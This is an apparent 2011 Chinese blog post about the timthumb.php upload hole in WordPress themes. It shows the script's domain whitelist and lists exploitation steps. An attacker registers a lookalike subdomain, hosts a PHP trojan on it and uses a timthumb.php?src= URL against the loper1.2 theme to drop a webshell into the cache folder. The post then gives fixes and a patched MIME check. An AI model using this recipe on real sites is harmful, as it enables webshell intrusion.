---
title: 110804 请小心 timthumb.php
layout: post
permalink: /2205.html
bot_views:
  - 269
views:
  - 1203
post_views_count:
  - 0
ratings_users:
  - 0
ratings_score:
  - 0
duoshuo_thread_id:
  - 1280248249638191298
categories:
  - Code
tags:
  - loper1.2
  - timthumb.php
  - wordpress
  - 上传漏洞
---
[<img class="aligncenter size-medium wp-image-2206" title="uploadld" src="http://www.80aj.com/wp-content/uploads/2011/08/uploadld-300x187.jpg" alt="" width="300" height="187" />][1]

今天早上 CNBETA爆出了 wordpress 的  谷歌写的  timthumb.php 上传漏洞

我分析了下 入侵规则如下:

<pre dir="ltr">0 <span style="color: #888a85;">=&gt;</span></pre>

<small>string</small>

<pre dir="ltr"><span style="color: #cc0000;">'flickr.com'</span> <em>(length=10)</em>
  1 <span style="color: #888a85;">=&gt;</span></pre>

<small>string</small>

<pre dir="ltr"><span style="color: #cc0000;">'picasa.com'</span> <em>(length=10)</em>
  2 <span style="color: #888a85;">=&gt;</span></pre>

<small>string</small>

<pre dir="ltr"><span style="color: #cc0000;">'blogger.com'</span> <em>(length=11)</em>
  3 <span style="color: #888a85;">=&gt;</span></pre>

<small>string</small>

<pre dir="ltr"><span style="color: #cc0000;">'wordpress.com'</span> <em>(length=13)</em>
  4 <span style="color: #888a85;">=&gt;</span></pre>

<small>string</small>

<pre dir="ltr"><span style="color: #cc0000;">'img.youtube.com'</span> <em>(length=15)</em></pre>

<pre dir="ltr"></pre>

以上文件是timthumb.php 支持 图片的下载地址 或者 ALLOW_EXTERNAL 为TRUE 都会被跳过域名检查.

漏洞利用:

创建一个域名 http://flickr.com.80aj.com/

目录下上传 80aj.php

寻找有 timthumb.php 的主题或者插件包

这里只提供一个  关于  loper1.2 主题包 中就自带 timthumb.php文件  
使用如下URL上传木马:

http://www.*.com/wp-content/themes/loper1.2/timthumb.php?src=http://flickr.com.80aj.com/80aj.php

上传完以后访问:

http://www.*.com/wp-content/themes/loper1.2/cache/

寻找刚才上传的文件 直接访问即可.

修复方法:  
cache 目录下创建 index.html 或者 php  
进制 cache目录执行PHP相关代码  
代码后缀过滤 ,虽然代码中过滤了 进制上传的类型 但还是会下载下来

timthumb.php 相关强制关闭

<pre lang="php">/**
 * determine the file mime type
 *
 * @param  $file
 * @return
 */
function mime_type ($file) {

	$file_infos = getimagesize ($file);
	$mime_type = $file_infos['mime'];

    // use mime_type to determine mime type
    if (!preg_match ("/jpg|jpeg|gif|png/i", $mime_type)) {
		display_error ('Invalid src mime type: ' . $mime_type);
		echo "sorry ,error src type";
		exit();
    }

    return $mime_type;

}</pre>

timthumb.php相关新闻:

http://www.cnbeta.com/articles/150685.htm

 [1]: http://www.80aj.com/wp-content/uploads/2011/08/uploadld.jpg